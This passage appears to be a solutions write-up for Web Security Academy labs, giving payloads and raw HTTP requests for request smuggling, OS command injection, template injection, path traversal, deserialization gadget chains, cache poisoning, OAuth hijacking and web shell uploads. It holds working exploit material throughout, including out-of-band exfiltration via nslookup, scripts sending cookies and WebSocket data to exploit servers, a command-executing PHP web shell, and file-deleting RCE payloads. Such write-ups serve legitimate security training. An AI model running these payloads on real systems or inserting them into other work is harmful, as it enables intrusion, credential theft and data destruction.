Host: 0aa10022031f57b8839bf075004000fc.web-security-academy.net
Cookie: victim-fingerprint=XchbXstfr9kMYumQzHglvn9Sg1z4pxSs; secret=aM45zL11YFFQCrtomCCbsY5NztXRhRBV; session=KmVDLu3qlwSNTsfOENJ0hm1Gnji4qT88
...
```


#### HSMU.10 - Exploiting HTTP request smuggling to deliver reflected XSS

```
POST / HTTP/1.1
Host: 0ab30009038a2d4080d2494d0061002a.web-security-academy.net
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 120

0

GET /post?postId=6 HTTP/1.1
User-Agent: useragent"><script>alert(1)</script><a href="/test
Content-Length: 3

a
```


#### HSMU.11 - Response queue poisoning via H2.TE request smuggling

```
POST /404 HTTP/2
...
Content-Type: x-www-form-urlencoded
Content-Length: 149
Transfer-Encoding: chunked

0

POST /404 HTTP/1.1
Host: 0a32000c046da999825cd4a900ba008a.web-security-academy.net
Content-Type: x-www-form-urlencoded
Content-Length: 1

a
```

Send more requests until you get a 302 redirection with some cookies, use the cookies to access /admin.


#### HSMU.12 - H2.CL request smuggling

```
POST / HTTP/2
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


GET /resources HTTP/1.1
Host: exploit-0a4f00f203b90e88815a42a701ee00bd.exploit-server.net
Content-Length: 10

a
```


#### HSMU.13 - HTTP2 request smuggling via CRLF injection

```
POST / HTTP/2
...
Fo: ba\r\nTransfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded
Content-Length: 112

0

POST /post/comment HTTP/1.1
Host: 0a17003f0315a26781520cb5003200e0.web-security-academy.net
Cookie: session=BEv90Mt3fW0Ua3AiXdnRALcLTbcb1cfg; _lab_analytics=W8jIeMIzkpt2G9gyOcEFT7MFiZ9uNAOOZ88XEIvVkMgtrQsLrERyvJzQWYeBc1PbyatXyOMh1ZeLQyaqanxeybVTjzHVgx9YB99tmlK2eAkoQgvyLpNdoA3RE1zMyYP90bUEpeuwHcz8h0Fqcg8FLqvmVUbp1BAOCpmqjZ5jPJIVyleFT7Hye1PWojmaKKbY4pRRrF6d8yWPs1k4dP1aCt6d6UcTgLvoKp4Ji6amjKEGvwTm4s0cR8zPbWSmFnf0
Content-Length: 200

csrf=NO7t8vaJHMNuLmScMM45gMnp6NskWAQg&postId=9&name=test2&email=test3@test.com&website=http://test4.com&comment=
```


#### HSMU.14 - HTTP2 request splitting via CRLF injection

Intercept the GET request and add “\r\n”, the “Host” header, “\r\n”, “\r\n” and the new request inside the "foo" header:

```
ba
Host: 0a5f00f003d0fe7d8643783800450004.web-security-academy.net

GET /admin HTTP/1.1
Host: 0a5f00f003d0fe7d8643783800450004.web-security-academy.net
```


#### HSMU.15 - CL.0 request smuggling

```
POST /resources/images/blog.svg HTTP/1.1
...
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```


## <a name="10"></a>10 - OS command injection


#### CINJ.01 - OS command injection, simple case

```
POST /product/stock HTTP/2
...

productId=1&storeId=1;whoami
```


#### CINJ.02 - Blind OS command injection with time delays

```
"; ping -c 127.0.0.1; echo "a
```


#### CINJ.03 - Blind OS command injection with output redirection

```
' & whoami > /var/www/images/whoami.txt
" & whoami > /var/www/images/whoami.txt
whoami > /var/www/images/whoami.txt
```


#### CINJ.04 - Blind OS command injection with out-of-band interaction

```
`nslookup 7s0qd0oqa0r71b9pewc0nu7a41asynmc.oastify.com`
```


#### CINJ.05 - Blind OS command injection with out-of-band data exfiltration


```
$(nslookup `whoami`.m1o5mfx5jf0maqi4nblfw9gpdgj774vt.oastify.com)
```


## <a name="11"></a>11 - Server-side template injection (SSTI)

#### SSTI.01 - Basic server-side template injection

```
/?message=<%=+system('rm+/home/carlos/morale.txt')+%>
```


#### SSTI.02 - Basic server-side template injection (code context)

```
POST /my-account/change-blog-post-author-display HTTP/2
...

blog-post-author-display=user.nickname}}{%+import+os+%}{{os.popen("rm+/home/carlos/morale.txt").read()}}&csrf=PdLe58H5wvdQEv1PtPmQOJMvRz3krZgs
```


#### SSTI.03 - Server-side template injection using documentation

```
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```


#### SSTI.04 - Server-side template injection in an unknown language with a documented exploit

```
%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
```


#### SSTI.05 - Server-side template injection with information disclosure via user-supplied objects

```
{{settings.SECRET_KEY}}
```




## <a name="12"></a>12 - Directory traversal


#### TRAV.01 - File path traversal, simple case

```
/image?filename=../../../etc/passwd 
```


#### TRAV.02 - File path traversal, traversal sequences blocked with absolute path bypass

```
/image?filename=/etc/passwd 
```


#### TRAV.03 - File path traversal, traversal sequences stripped non-recursively

```
/image?filename=..././..././..././..././..././etc/passwd
```


#### TRAV.04 - File path traversal, traversal sequences stripped with superfluous URL-decode

```
/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
```


#### TRAV.05 - File path traversal, validation of start of path

```
/image?filename=/var/www/images/../../../etc/passwd
```


#### TRAV.06 - File path traversal, validation of file extension with null byte bypass

```
/image?filename=../../../etc/passwd%00.png
```




## <a name="13"></a>13 - Access control vulnerabilities


#### ACCE.01 - Unprotected admin functionality

The admin panel path is in the robots.txt file.


#### ACCE.02 - Unprotected admin functionality with unpredictable URL

By clicking Control+u we can read the source code and find the admin panel.


#### ACCE.03 - User role controlled by request parameter

After logging in we see a redirection where the value of the cookie “Admin” is set to “false”. Changing it to “true”, we can see and visit the admin panel to delete the user.


#### ACCE.04 - User role can be modified in user profile

```
POST /my-account/change-email HTTP/2
...

{"email":"test@test.com", "roleid":2}
```


#### ACCE.05 - User ID controlled by request parameter

Clicking the “Home” button generates a GET request "/my-account?id=wiener". Changing the id to carlos we can get the API key.


#### ACCE.06 - User ID controlled by request parameter, with unpredictable user IDs

We can get the administrator's GUID from the blog posts and access "/my-account?id=ADMIN_GUID".


#### ACCE.07 - User ID controlled by request parameter with data leakage in redirect

Clicking the “Home” button generates a GET request "/my-account?id=wiener". Changing the id to carlos there is a redirection but we can read in the response the API key.


#### ACCE.08 - User ID controlled by request parameter with password disclosure

Clicking the “Home” button generates a GET request "/my-account?id=wiener". Changing the id to administrator we get access to the account. Then change the type of the password field to "text" in the HTML code.


#### ACCE.09 - Insecure direct object references

```
/download-transcript/1.txt
```


#### ACCE.10 - URL-based access control can be circumvented

```
GET /?username=carlos HTTP/2
X-Original-Url: /admin/delete
```


#### ACCE.11 - Method-based access control can be circumvented

```
/admin-roles?username=wiener&action=upgrade
```


#### ACCE.12 - Multi-step process with no access control on one step

```
POST /admin-roles
...
username=wiener&action=upgrade&confirmed=true
```


#### ACCE.13 - Referer-based access control

```
GET /admin-roles?username=wiener&action=upgrade HTTP/2
...
Referer: https://0afd00fc039e68c881769dfa009b00b8.web-security-academy.net/admin
...
```


## <a name="14"></a>14 - Authentication


#### AUTH.01 - Username enumeration via different responses

From the response size we can detect a different response.


#### AUTH.02 - 2FA simple bypass

After logging in as carlos we have to send the security code but we can access / and then click “Home”.


#### AUTH.03 - Password reset broken logic

```
POST /forgot-password?temp-forgot-password-token=eeiyUnDFWhZqlaBJz707cipGPxh7bN4T HTTP/2
...

temp-forgot-password-token=eeiyUnDFWhZqlaBJz707cipGPxh7bN4T&username=carlos&new-password-1=password&new-password-2=password
```


#### AUTH.04 - Username enumeration via subtly different responses

Adding a new column we find one of the responses does not contain the ending “.”.


#### AUTH.05 - Username enumeration via response timing

We can see which requests took longer. For this, it is important to set a very long password.


#### AUTH.06 - Broken brute-force protection, IP block

I created a short Python script to generate the user list:

```
all_passw = open("100pass.txt").read().splitlines()

counter = 0
num = 5

print("wiener")
#print("peter")
for i in all_passw:
        counter += 1
        print("carlos")
        #print(i)
        if counter % num == 0:
                print("wiener")
                #print("peter")
```                
                
And the password list:

```
all_passw = open("100pass.txt").read().splitlines()

counter = 0
num = 5

#print("wiener")
print("peter")
for i in all_passw:
        counter += 1
        #print("carlos")
        print(i)
        if counter % num == 0:
                #print("wiener")
                print("peter")
```

I added 1000 milliseconds between request in Resource Pool:


#### AUTH.07 - Username enumeration via account lock

The user “pi” was locked. Then we will set the username and test all passwords. One request does not return the message of invalid password or too many requests, it seems it is blank. This is the correct password.


#### AUTH.08 - 2FA broken logic

After the first login there is a redirection which creates the cookie with value “verify=wiener” and we can change it to “verify=carlos”. When we get to "/login2" the “verify” cookie is for carlos and we do not receive a MFA code. But we can send this to Intruder and we can bruteforce it. The code “1985” generates a different response and we log in as carlos.


#### AUTH.09 - Brute-forcing a stay-logged-in cookie

The content of the cookie is the Base64 encode value of “wiener:51dc30ddc473d43a6011e9ebba6ca770”, and “51dc30ddc473d43a6011e9ebba6ca770” is the MD5 hash of “peter”. So the formula for the cookie is BASE64(user:MD5(password)).

```
import hashlib, base64

pwds = open("pass.txt").read().splitlines()

for i in pwds:
        result = hashlib.md5(i.encode())
        #print(result.hexdigest())
        message = "carlos:"+result.hexdigest()
        #print(message)
        message_bytes = message.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        print(base64_message)
```

#### AUTH.10 - Offline password cracking

```
<script>var i=new Image;i.src="https://exploit-0a500006035b831a8133a1940130000d.exploit-server.net/log?cookie="+document.cookie;</script>
```

It uses the same password structure as the previous lab, BASE64(user:MD5(password)), in this case the MD5 hash for “onceuponatime”.


#### AUTH.11 - Password reset poisoning via middleware

```
POST /forgot-password HTTP/2
...
X-Forwarded-Host: exploit-0a870063038466fd80799d71012c004f.exploit-server.net

username=carlos
```


#### AUTH.12 - Password brute-force via password change

There is a function to update the password, it generates a POST request with the username and current password as parameters. When the current password is correct but the new passwords are different the message is different that when the new passwords do not match and the current password is wrong.


## <a name="15"></a>15 - WebSockets

#### WSOCK.01 - Manipulating WebSocket messages to exploit vulnerabilities

```
script><img src=1 onerror='alert(1)'></script>
```


#### WSOCK.02 - Manipulating the WebSocket handshake to exploit vulnerabilities

```
ScRIpT><iMg sRc=x OnErRoR=alert`1`>
```


#### WSOCK.03 - Cross-site WebSocket hijacking

```
<script>
    var ws = new WebSocket('wss://0ab10034038a49a581f67501001e002b.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://v95x1aaxyvlt8fptdelcbw94ovumie63.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```


## <a name="16"></a>16 - Web cache poisoning


#### WCACH.01 - Web cache poisoning with an unkeyed header

Create a file "alert(document.cookie)" in /resources/js/tracking.js in the exploit server.

```
GET / HTTP/2
...
X-Forwarded-Host: exploit-0a26003703122ceb80d4074501290007.exploit-server.net
```


#### WCACH.02 - Web cache poisoning with an unkeyed cookie

```
GET / HTTP/2
Cookie: session=OwRJHH4NdgNoL0ghzNHYgwQTFpmM6m0G; fehost=prod-cache-01"}</script><script>alert(1)</script><script>{"
...
```


#### WCACH.03 - Web cache poisoning with multiple headers

Create a file "alert(document.cookie)" in /resources/js/tracking.js in the exploit server. Poison using the headers:

```
X-Forwarded-Host: ExploitServerDomain
X-Forwarded-Scheme: http
```


#### WCACH.04 - Targeted web cache poisoning using an unknown header

Exploit XSS to find User-Agent:

```
<img src="https://exploit-0acc00f704141c10817b1b2e011000d5.exploit-server.net/foo" />
```

```
GET / HTTP/1.1
...
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
X-Host: exploit-0acc00f704141c10817b1b2e011000d5.exploit-server.net
...
```


#### WCACH.05 - Web cache poisoning via an unkeyed query string

```
GET / HTTP/2
...
Pragma: x-get-cache-key
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.0a68004803664d558681b8a800650043.web-security-academy.net
```

```
GET /?evil='/><script>alert(1)</script> HTTP/2
...
Origin: 0a68004803664d558681b8a800650043.web-security-academy.net
```

```
GET /?evil='/><script>alert(1)</script> HTTP/2
...
```


#### WCACH.06 - Web cache poisoning via an unkeyed query parameter

```
GET /?utm_content=testing123'/><script>alert(1)</script><link+href='/ HTTP/2
...
Pragma: x-get-cache-key
Origin: 0a4b00720459a58f800058b200dc0063.web-security-academy.net
```

```
GET /?utm_content=testing123'/><script>alert(1)</script><link+href='/ HTTP/2
...
```


#### WCACH.07 - Parameter cloaking

```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1) HTTP/2
...
Pragma: x-get-cache-key
Origin: https://cachebuster.0afc006103e7279e80ff71c000b0005c.web-security-academy.net
```

```
/js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```


#### WCACH.08 - Web cache poisoning via a fat GET request

```
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
...
Origin: https://cachebuster.0afc006103e7279e80ff71c000b0005c.web-security-academy.net
X-Http-Method-Override: POST
Content-Length: 17

callback=alert(1)
```

```
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
...
X-Http-Method-Override: POST
Content-Length: 17

callback=alert(1)
```


#### WCACH.09 - URL normalization

Use the URL-encoded version of /<script>alert(1)</script> (they have the same cache key)

```
/%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
```


## <a name="17"></a>17 - Insecure deserialization


#### DESE.01 - Modifying serialized objects

Base64-decode the cookie, change the "admin" value to 1 and re-encode it.


#### DESE.02 - Modifying serialized data types

Use the integer 0 as access token:

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
```


#### DESE.03 - Using application functionality to exploit insecure deserialization

The avatar image is deleted when deleting the account, so we will change the object to:

```
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"ut8z43bk6jtuk09nn9ahkzax9okpyr6l";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}

Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImdyZWdnIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6InV0OHo0M2JrNmp0dWswOW5uOWFoa3pheDlva3B5cjZsIjtzOjExOiJhdmF0YXJfbGluayI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30=
```


#### DESE.04 - Arbitrary object injection in PHP

We have to create a “CustomTemplate” object that calls “__destruct()” so it deletes the file “/home/carlos/morale.txt”:

```
O:14:"CustomTemplate":2:{s:18:"template_file_path";s:23:"/home/carlos/morale.txt";s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}

TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MTg6InRlbXBsYXRlX2ZpbGVfcGF0aCI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ
```


#### DESE.05 - Exploiting Java deserialization with Apache Commons

```
java -jar ysoserial-all.jar CommonsCollections2 "rm /home/carlos/morale.txt" | base64 | tr -d "\n"
```


#### DESE.06 - Exploiting PHP deserialization with a pre-built gadget chain

Get the token from:

``` 
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' -b
``` 

Using this tool (https://www.freeformatter.com/hmac-generator.html#before-output) I found the signature of the serialized object ("sig_hmac_sha1") is generated with the SECRET_KEY from phpinfo.php, we can generate the token signature the same way ("fbe3dee997e7304ff810a2806c562e5ef9523d67 ").

```
GET /my-account HTTP/2
...
Cookie: session=%7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319%22%2C%22sig_hmac_sha1%22%3A%22949d68ba69539c85a418c7939d1607a6bc3be7f7%22%7D
...
```


#### DESE.07 - Exploiting Ruby deserialization using a documented gadget chain

Get the script from this blog to create the payload: https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html. Update it to delete the file.

```
GET /my-account HTTP/2
...
Cookie: session=BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
...
```


## <a name="18"></a>18 - Information disclosure

#### INFD.01 - Information disclosure in error messages

```
/product?productId=aaa
```


#### INFD.02 - Information disclosure on debug page

```
/cgi-bin/phpinfo.php
```


#### INFD.03 - Source code disclosure via backup files

In /robots.txt:

```
/backup
```


#### INFD.04 - Authentication bypass via information disclosure

```
TRACE /
```

```
GET /admin/delete?username=carlos HTTP/2
...
X-Custom-Ip-Authorization: 127.0.0.1
```

#### INFD.05 - Information disclosure in version control history

```
bash gitdumper.sh https://0afa00c404fb4d8581880c60002e004e.web-security-academy.net/.git/ /tmp/a/
cd /tmp/a
git status
git log
git reset --hard d3e84943424222ce64de7da0d797b7dfdef39ea1
cat admin.conf
```




## <a name="19"></a>19 - Business logic vulnerabilities

#### BUSL.01 - Excessive trust in client-side controls

```
POST /cart HTTP/2
...

productId=1&redir=PRODUCT&quantity=1&price=133700
```


#### BUSL.02 - High-level logic vulnerability

We can set the quantity to a negative value but we can not purchase it. However we can add the item and then a negative number for other product.


#### BUSL.03 - Inconsistent security controls


You can change the email to one ending with “@dontwannacry.com” and then access “/admin” to delete the user.


#### BUSL.04 - Flawed enforcement of business rules

We can not use the same coupon twice in a row but we can use once each until we get a full discount.


#### BUSL.05 - Low-level logic flaw

16061  l33t jacket items cost 2 million dollars but 16062 items cost -2 million dollars. Add 32122 jackets and adjust the negative value adding other products.


#### BUSL.06 - Inconsistent handling of exceptional input

```
POST /register HTTP/2
...

csrf=alQnzW8wE9JhzqQtr4xigsVi409cfLqF&username=test15&email=attackeraaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%40dontwannacry.com.exploit-0a67006c0423355d834f36b001cf0030.exploit-server.net&password=test15
```


#### BUSL.07 - Weak isolation on dual-use endpoint

```
POST /my-account/change-password HTTP/2
...

csrf=ujBucKnnF9611L81nMWHpHhtHVneK8JR&username=administrator&new-password-1=test&new-password-2=test
```


#### BUSL.08 - Insufficient workflow validation

After adding the leather jacket and clicking Place order you get a POST request and a GET request but to “/cart?err=INSUFFICIENT_FUNDS”. If you substitute that with “/cart/order-confirmation?order-confirmed=true” the order is created.


#### BUSL.09 - Authentication bypass via flawed state machine

After logging in, change the “Location” header in the response to redirect to “/admin”.


#### BUSL.10 - Infinite money logic flaw

We will get as many as possible gift cards with the current money and use intruder to validate all the codes, continue the process getting a total of (Total money % 7) gift cards and redeeming them until you get more than 1000 dollars.


#### BUSL.11 - Authentication bypass via encryption oracle

When a comment is sent there is a cookie “notification” with an encrypted value. This notification is the message that appears in the post, in this case “Invalid email address: test”. With a base64-encoded value “YQ==” we see information about the encryption. It looks it uses padded cipher and blocks of 16 bytes, so it could be AES-128.

Knowing it uses 16-bytes blocks and there is a prefix of 23 characters ("Invalid email address: “), we will add 9 characters of ”padding" in that second ciphered block. We will take the encrypted value, URL-decode and base64-decode it, and delete the first 2 16-bytes blocks:

```
bRmw%2bImnDFvvwECQSiG1J8dfoUcrqKgkyQfr8wfI1J9bRCG%2bSLS06HPtXsMPhzuBQTkxD8oSxM2l3LhRCdZ3IQ%3d%3d
bRmw+ImnDFvvwECQSiG1J8dfoUcrqKgkyQfr8wfI1J9bRCG+SLS06HPtXsMPhzuBQTkxD8oSxM2l3LhRCdZ3IQ==
...
W0Qhvki0tOhz7V7DD4c7gUE5MQ/KEsTNpdy4UQnWdyE=
W0Qhvki0tOhz7V7DD4c7gUE5MQ/KEsTNpdy4UQnWdyE%3d
```

## <a name="20"></a>20 - HTTP Host header attacks


#### HOST.01 - Basic password reset poisoning

Change the Host header to the exploit server in the request to /forgot-password

```
POST /forgot-password HTTP/2
Host: ExploitServer
...
```


#### HOST.02 - Host header authentication bypass

```
GET /admin/delete?username=carlos HTTP/2
Host: localhost
...
```


#### HOST.03 - Web cache poisoning via ambiguous requests

```
GET / HTTP/2
Host: testing123"></script><script>alert(document.cookie)</script><script>
Host: 0af500ba04a9e93b802c499200750009.web-security-academy.net
...
```


#### HOST.04 - Routing-based SSRF

```
GET /admin/delete?username=carlos HTTP/2
Host: 192.168.0.127
...
```


#### HOST.05 - SSRF via flawed request parsing

```
POST /admin/delete HTTP/2
Host: 192.168.0.113
Host: 0a5100f104ffdc65c3832510004000cf.web-security-academy.net
...

username=carlos&csrf=IJTFhUceFHwKZHdbhX2eW0ayNuKksPhv
```


#### HOST.06 - Host validation bypass via connection state attack

```
GET / HTTP/2
Host: 0a6a005e030d906b874c2bf300490073.web-security-academy.net
...
```

```
POST /admin/delete HTTP/2
Host: 192.168.0.1
...

username=carlos&csrf=CY6qJXGEMwYMKu0z18mEKfFo2zAoE866
```


## <a name="21"></a>21 - OAuth authentication

#### OAUTH.01 - Authentication bypass via OAuth implicit flow

One of the last requests is a POST request to “/authenticate” with the information of the user. Change it to carlos' information.


#### OAUTH.02 - Forced OAuth profile linking

The last request is a GET request to “/oauth-linking” with a code. Create an iframe for the victim to access this link:

```
<iframe src="https://0a0200d703e9d1e08553857b002e00df.web-security-academy.net/oauth-linking?code=jETtPOj5DHmBoJt_E3Po0I2PQEndgDoRhuFexNBuDpt"></iframe>
```


#### OAUTH.03 - OAuth account hijacking via redirect_uri

```
<body onload="window.open('https://oauth-0a5f00ff04d45537c1f997b8025a00a0.oauth-server.net/auth?
client_id=wkw7zy0gcxh46yxashxrk&redirect_uri=https://exploit-0a4c00770488559fc1e198fb01180071.exploit-
server.net/&response_type=code&scope=openid%20profile%20email')">
```


#### OAUTH.04 - Stealing OAuth access tokens via an open redirect

```
GET /auth?client_id=oy2ed6shddhvjw8klmsnu&redirect_uri=https://0a5100fc036a387b81e8347900740079.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ac500c0030538a5812f33c001d60054.exploit-server.net/exploit&response_type=token&nonce=328741005&scope=openid%20profile%20email HTTP/2
```

```
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-0a6500a0036c389681a332430272000a.oauth-server.net/auth?client_id=oy2ed6shddhvjw8klmsnu&redirect_uri=https://0a5100fc036a387b81e8347900740079.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ac500c0030538a5812f33c001d60054.exploit-server.net/exploit/&response_type=token&nonce=-1318932807&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```


#### OAUTH.05 - SSRF via OpenID dynamic client registration


```
POST https://oauth-0a76003403dd792f81c9abe702320017.oauth-server.net/reg HTTP/2
Host: oauth-0a76003403dd792f81c9abe702320017.oauth-server.net
...

{
    "application_type": "web",
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
        ],
    "client_name": "My Application",
    "logo_uri": "https://client-app.com/logo.png",
    "token_endpoint_auth_method": "client_secret_basic",
    "jwks_uri": "https://client-app.com/my_public_keys.jwks",
    "userinfo_encrypted_response_alg": "RSA1_5",
    "userinfo_encrypted_response_enc": "A128CBC-HS256"
}
```

```
GET /client/m7xK68ZFDecUNKJ6U91xk/logo
```



## <a name="22"></a>22 - File upload vulnerabilities

#### UPLD.01 - Remote code execution via web shell upload

```
POST /my-account/avatar HTTP/2
...
Content-Disposition: form-data; name="avatar"; filename="test.php"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret'); ?>
...
```

#### UPLD.02 - Web shell upload via Content-Type restriction bypass

```
POST /my-account/avatar HTTP/2
...
Content-Disposition: form-data; name="avatar"; filename="test.php"
Content-Type: image/png

<?php echo file_get_contents('/home/carlos/secret'); ?>
...
```


#### UPLD.03 - Web shell upload via path traversal

```
Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fb.php"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```



#### UPLD.04 - Web shell upload via extension blacklist bypass

```
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: application/octet-stream

AddType application/x-httpd-php .l33t
```

```
Content-Disposition: form-data; name="avatar"; filename="cmd.l33t"
Content-Type: application/octet-stream

<?php
if($_GET['cmd']) {
  system($_GET['cmd']);
}
```

```
/files/avatars/cmd.l33t?cmd=whoami
```


#### UPLD.05 - Web shell upload via obfuscated file extension

```
Content-Disposition: form-data; name="avatar"; filename="test.php%00.jpg"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

